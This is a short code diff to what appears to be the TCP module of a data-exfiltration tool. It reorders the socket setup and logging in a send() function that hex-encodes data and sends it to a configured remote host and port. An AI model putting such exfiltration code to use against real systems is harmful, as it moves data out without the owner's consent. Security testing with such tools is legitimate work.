@@ -12,14 +12,10 @@ def send(data):
     else:
         target = config['target']
     port = config['port']
-    app_exfiltrate.log_message(
-        'info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
     packet_index = data.split('|!|')[1]
     app_exfiltrate.log_message(
         'info', "[tcp] Sending {0} bytes with TCP packet to {1}. PacketIndex = {2}".format(len(data), target, packet_index))
-    
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   
     client_socket.connect((target, port))
     client_socket.send(data.encode('hex'))
     client_socket.close()
